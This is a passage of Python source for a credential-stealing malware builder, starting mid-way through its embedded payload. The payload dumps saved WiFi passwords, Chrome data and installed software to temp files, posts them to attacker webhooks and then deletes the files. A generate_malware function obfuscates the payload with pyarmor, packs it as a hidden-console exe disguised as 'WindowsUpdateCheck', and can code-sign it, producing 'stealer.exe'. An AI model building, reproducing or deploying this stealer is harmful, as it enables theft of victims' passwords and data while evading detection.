        wifi_path = os.path.join(os.getenv("TEMP"), f"wifi_pw_{random.randint(10000,99999)}.txt")
        with open(wifi_path, "w", encoding="utf-8") as f:
            f.write("SAVED WIFI PASSWORDS\\n" + wifi_data)
        files_to_send["wifi_passwords.txt"] = open(wifi_path, "rb")
        temp_files.append(wifi_path)

    soft_data = list_installed_software()
    if soft_data.strip():
        soft_path = os.path.join(os.getenv("TEMP"), f"software_{random.randint(10000,99999)}.txt")
        with open(soft_path, "w", encoding="utf-8") as f:
            f.write("INSTALLED SOFTWARE\\n" + soft_data)
        files_to_send["installed_software.txt"] = open(soft_path, "rb")
        temp_files.append(soft_path)

    for hook in webhooks:
        try:
            payload = {"content": f"**FAT HIT** - {os.getenv('USERNAME')}@{platform.node()} - Chrome/WiFi/Software dumped"}
            resp = requests.post(hook, data=payload, files=files_to_send, timeout=40)
            if resp.status_code in (200, 204):
                break
        except: continue
    else:
        try:
            requests.post(webhooks[0], json={"content": f"Fallback recon:\\n```\\n{base_recon}\\n```"})
        except: pass

    for f in files_to_send.values():
        try: f.close()
        except: pass
    for p in temp_files:
        try: os.remove(p)
        except: pass

exfil({WEBHOOK_PLACEHOLDER})
''')

# =================== BUILD WITH CRYPTO FIX ===================
def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
    if not shutil.which("pyarmor"):
        raise Exception("pyarmor missing - pip install pyarmor")
    if not shutil.which("pyinstaller"):
        raise Exception("pyinstaller missing - pip install pyinstaller")

    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
    script = os.path.join(temp_dir, "recon.py")
    hook_str = repr(webhooks)
    with open(script, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))

    obf_dir = os.path.join(temp_dir, "obf")

    gen_cmd = ["pyarmor", "gen", "-O", obf_dir]
    if mode == 1:
        gen_cmd += ["--advanced", "2", "--mix-str"]
    elif mode == 2:
        gen_cmd += ["--enable-rft"]
    gen_cmd += [script]

    result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"Pyarmor failed (mode {mode} needs license):\n{result.stderr}")

    obf_script = os.path.join(obf_dir, "recon.py")

    hidden_imports = [
        "pyarmor_runtime", "uuid", "ctypes", "socket", "winreg", "platform",
        "datetime", "random", "subprocess", "os", "sys", "time", "requests",
        "pyautogui", "sqlite3", "json", "base64", "shutil", "win32crypt",
        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES"
    ]
    hidden_args = [item for mod in hidden_imports for item in ["--hidden-import", mod]]

    pyi_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--name", "WindowsUpdateCheck",
    ] + hidden_args + [obf_script]

    result = subprocess.run(pyi_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"PyInstaller failed:\n{result.stderr}")

    bundled_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
    final = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(bundled_exe, final)

    if pfx_path and os.path.exists(pfx_path):
        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256"]
        if pfx_pass:
            sign_cmd += ["/p", pfx_pass]
        sign_cmd += [final]
        sign_result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if sign_result.returncode != 0:
            print(f"Signing failed:\n{sign_result.stderr}")
        else:
            print("Signed.")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Full loot stealer built: {final}")

if __name__ == "__main__":
    get_webhook()
